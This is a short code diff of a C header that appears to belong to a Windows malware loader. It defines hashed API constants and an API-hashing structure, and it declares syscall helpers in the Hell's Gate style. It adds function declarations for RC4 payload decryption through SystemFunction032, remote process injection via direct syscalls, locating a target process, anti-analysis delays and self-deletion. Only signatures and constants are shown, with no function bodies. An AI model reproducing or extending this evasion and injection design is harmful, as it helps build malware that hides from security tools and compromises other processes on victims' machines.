@@ -21,12 +21,10 @@
 #define SetWindowsHookExW_JOAA  0x15580F7F
 #define UnhookWindowsHookEx_JOAA        0x9D2856D0
 #define GetModuleFileNameW_JOAA         0xAB3A6AA1
-#define CloseHandle_JOAA        0x9E5456F2
 #define CreateFileW_JOAA        0xADD132CA
 #define GetTickCount64_JOAA     0x00BB616E
 #define OpenProcess_JOAA        0xAF03507E
 #define SetFileInformationByHandle_JOAA         0x6DF54277
-#define CloseHandle_JOAA        0x9E5456F2
 #define SystemFunction032_JOAA  0x8CFD40A8
 #define KERNEL32DLL_JOAA       0xFD2AD9BD
 #define USER32DLL_JOAA         0x349D72E7
@@ -67,7 +65,6 @@ typedef struct _API_HASHING {
 	fnGetModuleFileNameW            pGetModuleFileNameW;
 	fnCreateFileW                   pCreateFileW;
 	fnSetFileInformationByHandle    pSetFileInformationByHandle;
-	fnCloseHandle                   pCloseHandle;
 
 }API_HASHING, * PAPI_HASHING;
 
@@ -86,7 +83,13 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 extern VOID ConfS(WORD wSystemCall);
 extern RunSys();
 
+BOOL InitializeSyscalls();
+BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize);
+BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal);
+BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess);
+
 BOOL AntiAnalysis(DWORD dwMilliSeconds);
+BOOL DeleteSelf();
 
 HMODULE GetModuleHandleH(DWORD dwModuleHash);
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
